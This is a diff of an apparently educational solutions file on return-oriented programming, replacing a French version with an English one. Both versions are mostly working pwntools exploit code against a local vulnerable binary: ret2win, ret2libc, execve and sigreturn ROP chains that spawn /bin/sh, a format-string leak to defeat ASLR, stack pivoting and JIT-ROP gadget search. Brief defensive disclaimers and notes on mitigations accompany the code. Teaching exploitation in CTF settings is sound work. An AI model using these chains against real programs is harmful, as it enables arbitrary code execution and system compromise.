@@ -1,225 +1,234 @@
-═══════════════════════════════════════════════════════════════════
-SOLUTIONS - Module 38 : ROP Chains
-═══════════════════════════════════════════════════════════════════
+SOLUTIONS - MODULE 38 : ROP CHAINS
 
-SOLUTION 1 : ROPgadget Finder
-═══════════════════════════════════════════════════════════════════
+⚠️ AVERTISSEMENT : Techniques pour compréhension défensive uniquement.
 
-Utiliser les outils existants :
+SOLUTION 1 : GADGET FINDER
 
-ROPgadget --binary vuln --ropchain
+Using ROPgadget :
+$ ROPgadget --binary ./vuln | grep "pop rdi"
+0x00401234 : pop rdi ; ret
 
-ropper --file vuln --search "pop rdi"
+$ ROPgadget --binary ./vuln | grep "pop rsi"
+0x00401236 : pop rsi ; ret
 
-# Python avec capstone
-import capstone
+$ ROPgadget --binary ./vuln | grep syscall
+0x0040125a : syscall ; ret
 
-md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
-# Désassembler et chercher patterns
+Save to file :
+$ ROPgadget --binary ./vuln > gadgets.txt
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 2 : ret2libc Exploit
-═══════════════════════════════════════════════════════════════════
+Using ropper (alternative) :
+$ ropper --file ./vuln --search "pop rdi"
 
+Bypass : N/A (finding gadgets is legitimate analysis)
+
+
+SOLUTION 2 : BASIC RET2WIN
+
+Calculate offset :
+$ gdb ./vuln
+(gdb) pattern create 100
+(gdb) run
+(gdb) x/wx $rsp
+(gdb) pattern offset 0x6161616c  # Gives offset = 72
+
+Build payload (Python) :
 from pwn import *
 
-# Programme vulnérable
+p = process('./vuln')
+win_addr = 0x401196  # Address of win() function
+
+payload = b'A' * 72  # Padding to saved RIP
+payload += p64(win_addr)  # Overwrite RIP with win()
+
+p.sendline(payload)
+p.interactive()
+
+Bypass : Stack canary defeats this (if enabled)
+
+
+SOLUTION 3 : RET2LIBC EXPLOITATION
+
+Find libc addresses :
+$ ldd ./vuln
+    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)
+
+$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
+00000000000554e0 T system
+
+$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+  1b75aa /bin/sh
+
+Build exploit (pwntools) :
+from pwn import *
+
 elf = ELF('./vuln')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-# Adresses
+pop_rdi = 0x401234  # From ROPgadget
+ret = 0x40101a      # Stack alignment
+
 system = libc.symbols['system']
 binsh = next(libc.search(b'/bin/sh'))
-pop_rdi = 0x400683  # Trouver avec ROPgadget
 
-# Payload
-payload = b'A' * 72  # Padding jusqu'à saved RIP
+payload = b'A' * 72
+payload += p64(ret)         # Align stack (needed on modern systems)
+payload += p64(pop_rdi)     # pop rdi ; ret
+payload += p64(binsh)       # "/bin/sh" address
+payload += p64(system)      # Call system("/bin/sh")
+
+p = process('./vuln')
+p.sendline(payload)
+p.interactive()  # Got shell!
+
+Bypass : ASLR defeats fixed addresses (need leak)
+
+
+SOLUTION 4 : FULL ROP CHAIN (EXECVE)
+
+Find gadgets :
+pop_rdi = 0x401234  # pop rdi ; ret
+pop_rsi = 0x401236  # pop rsi ; ret
+pop_rdx = 0x401238  # pop rdx ; ret
+pop_rax = 0x40123a  # pop rax ; ret
+syscall = 0x40125a  # syscall ; ret
+
+binsh_addr = 0x404000  # "/bin/sh" in .data section
+
+ROP chain :
+payload = b'A' * 72
+
+# execve("/bin/sh", NULL, NULL)
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)  # rdi = "/bin/sh"
+
+payload += p64(pop_rsi)
+payload += p64(0)           # rsi = NULL
+
+payload += p64(pop_rdx)
+payload += p64(0)           # rdx = NULL
+
+payload += p64(pop_rax)
+payload += p64(59)          # rax = 59 (execve syscall number)
+
+payload += p64(syscall)     # Execute syscall
+
+Bypass : CFI validates call targets, CET shadow stack prevents ROP
+
+
+SOLUTION 5 : ASLR BYPASS (INFO LEAK)
+
+Leak via printf format string :
+# Vulnerable: printf(user_input)
+payload = b'%p.%p.%p.%p.%p.%p'  # Leak stack addresses
+# Output: 0x7ffc... 0x7f... (libc addresses on stack)
+
+Calculate libc base :
+leaked_addr = int(leak.split('.')[2], 16)  # Get leaked libc address
+libc_base = leaked_addr - libc.symbols['__libc_start_main'] - 240
+
+system = libc_base + libc.symbols['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+Build ROP with calculated addresses :
+payload = b'A' * 72
+payload += p64(ret)
 payload += p64(pop_rdi)
 payload += p64(binsh)
 payload += p64(system)
 
-p = process('./vuln')
-p.sendline(payload)
-p.interactive()
+Bypass : PIE randomizes executable too, need multiple leaks
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 3 : ROP Chain Builder (pwntools)
-═══════════════════════════════════════════════════════════════════
 
-from pwn import *
+SOLUTION 6 : STACK PIVOTING
 
-elf = ELF('./vuln')
-rop = ROP(elf)
+Find pivot gadget :
+$ ROPgadget --binary ./vuln | grep "xchg.*rsp"
+0x00401260 : xchg rsp, rax ; ret
 
-# Construire chaîne execve("/bin/sh", NULL, NULL)
-binsh = next(elf.search(b'/bin/sh'))
+Prepare fake stack in bss :
+bss_addr = 0x404800  # Writable memory (bss or heap)
 
-rop.call('execve', [binsh, 0, 0])
-
-payload = b'A' * 72 + rop.chain()
-
-p = process('./vuln')
-p.sendline(payload)
-p.interactive()
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 4 : ASLR Bypass via Info Leak
-═══════════════════════════════════════════════════════════════════
-
-from pwn import *
-
-p = process('./vuln')
-
-# Stage 1 : Leak d'adresse
-p.recvuntil(b'Address: ')
-leak = int(p.recvline().strip(), 16)
-
-# Calculer base de libc (dépend de l'offset connu)
-libc_base = leak - 0x21b97  # Offset connu de la fonction fuie
-system = libc_base + 0x4f440
-
-# Stage 2 : ROP avec adresses absolues
+Stage 1 (small ROP to read into bss) :
 payload = b'A' * 72
 payload += p64(pop_rdi)
-payload += p64(leak + 0x1000)  # "/bin/sh" dans libc
-payload += p64(system)
+payload += p64(0)          # stdin
+payload += p64(pop_rsi)
+payload += p64(bss_addr)   # Destination
+payload += p64(pop_rdx)
+payload += p64(500)        # Size
+payload += p64(read_addr)  # Call read(0, bss, 500)
 
-p.sendline(payload)
-p.interactive()
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 5 : Stack Pivoting
-═══════════════════════════════════════════════════════════════════
-
-from pwn import *
-
-# Préparer ROP chain dans zone BSS contrôlée
-bss_addr = 0x601000
-xchg_rsp_rax = 0x400700
-
-# Écrire ROP chain en BSS via vulnérabilité
-# (dépend du binaire spécifique)
-
-# Pivoter
-payload = b'A' * 72
+# Pivot to bss
 payload += p64(pop_rax)
 payload += p64(bss_addr)
-payload += p64(xchg_rsp_rax)
+payload += p64(xchg_rsp_rax)  # RSP = bss_addr
 
-# RSP pointe maintenant vers bss_addr où se trouve notre ROP chain
+Stage 2 (send full ROP chain to bss) :
+# Now RSP points to bss, continue normal ROP
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 6 : Multi-Stage ROP
-═══════════════════════════════════════════════════════════════════
+Bypass : Modern stack protections, guard pages
 
+
+SOLUTION 7 : SIGROP (SIGRETURN ROP)
+
+Use pwntools SigreturnFrame :
 from pwn import *
 
-p = process('./vuln')
+context.arch = 'amd64'
 
-# Stage 1 : Appeler read(0, bss_addr, 1000)
-stage1 = b'A' * 72
-stage1 += p64(pop_rdi) + p64(0)      # stdin
-stage1 += p64(pop_rsi) + p64(bss_addr)
-stage1 += p64(pop_rdx) + p64(1000)
-stage1 += p64(read_addr)
-stage1 += p64(pivot_to_bss)
-
-p.sendline(stage1)
-
-# Stage 2 : ROP chain complète via read()
-stage2 = p64(pop_rdi) + p64(binsh)
-stage2 += p64(system)
-
-p.sendline(stage2)
-p.interactive()
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 7 : SROP (Sigreturn-Oriented Programming)
-═══════════════════════════════════════════════════════════════════
-
-from pwn import *
-
-p = process('./vuln')
-
-# Construire sigreturn frame
 frame = SigreturnFrame()
-frame.rax = 59       # execve
-frame.rdi = binsh
-frame.rsi = 0
-frame.rdx = 0
-frame.rip = syscall_addr
+frame.rax = 59              # execve
+frame.rdi = binsh_addr      # "/bin/sh"
+frame.rsi = 0               # NULL
+frame.rdx = 0               # NULL
+frame.rip = syscall_addr    # Execute syscall after sigreturn
 
-# Payload
 payload = b'A' * 72
-payload += p64(pop_rax) + p64(15)  # rt_sigreturn
-payload += p64(syscall_addr)
-payload += bytes(frame)
+payload += p64(pop_rax)
+payload += p64(15)          # sigreturn syscall number
+payload += p64(syscall)     # Call sigreturn(frame)
+payload += bytes(frame)     # Sigreturn frame
 
-p.sendline(payload)
-p.interactive()
+Manual frame (if no pwntools) :
+# 248 bytes structure with all register values
+# See sigcontext structure in <signal.h>
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 8 : JOP (Jump-Oriented Programming)
-═══════════════════════════════════════════════════════════════════
+Bypass : Kernel validation of sigreturn frames, hard to exploit
 
-# Gadgets JOP
-jmp_rax = 0x400650
 
-# Dispatcher : contrôle RAX puis jmp rax
-dispatcher = 0x400660  # mov rax, [rsp]; add rsp, 8; jmp rax
+SOLUTION 8 : JIT-ROP (ADVANCED)
 
-# JOP chain (différent de ROP)
-jop_chain = [
-    dispatcher,
-    gadget1_addr,
-    data1,
-    gadget2_addr,
-    data2,
-    # ...
-]
+Concept (browser exploit style) :
+1. Leak executable page address
+2. Read executable memory (info disclosure)
+3. Parse opcodes to find gadgets at runtime
+4. Build ROP chain with found gadgets
+5. Execute
 
-═══════════════════════════════════════════════════════════════════
-RESSOURCES SUPPLÉMENTAIRES
-═══════════════════════════════════════════════════════════════════
+Simplified code :
+// Read memory primitive
+void* leak = read_memory(code_addr, 1000);
 
-TUTORIELS :
-- ROPEmporium : https://ropemporium.com
-- LiveOverflow : YouTube channel
-- Nightmare : https://guyinatuxedo.github.io
+// Find "pop rdi ; ret" (5f c3 in opcodes)
+for (int i = 0; i < 1000-1; i++) {
+    if (leak[i] == 0x5f && leak[i+1] == 0xc3) {
+        pop_rdi = code_addr + i;
+        break;
+    }
+}
 
-OUTILS :
-- pwntools : pip install pwntools
-- ROPgadget : pip install ROPgadget
-- one_gadget : gem install one_gadget
+// Build ROP chain dynamically
+rop_chain[0] = pop_rdi;
+rop_chain[1] = arg;
+rop_chain[2] = target_func;
 
-CHALLENGES :
-- pwnable.kr
-- pwnable.tw
-- exploit.education
-- HackTheBox
+Bypass : Extremely advanced, used in modern browser/JIT exploits
 
-LIVRES :
-- "The Shellcoder's Handbook"
-- "Hacking: The Art of Exploitation"
-- "A Guide to Kernel Exploitation"
 
-═══════════════════════════════════════════════════════════════════
-RAPPEL FINAL
-═══════════════════════════════════════════════════════════════════
-
-ROP est une compétence offensive avancée.
-
-UTILISER UNIQUEMENT POUR :
-✓ Apprentissage sur CTF et challenges
-✓ Améliorer la sécurité défensive
-✓ Pentest autorisé contractuellement
-✓ Recherche académique éthique
-
-JAMAIS POUR :
-✗ Exploitation de systèmes sans autorisation
-✗ Développement de malware
-✗ Activités illégales
-
-Vous êtes responsable de vos actions.
-
-═══════════════════════════════════════════════════════════════════
+RÉFÉRENCES :
+- "Return-Oriented Programming" (Hovav Shacham)
+- ROP Emporium challenges (ret2win to fluff)
+- pwntools documentation (ROP module)
+- "The Art of Exploitation" (Jon Erickson)
+- LiveOverflow YouTube (binary exploitation series)
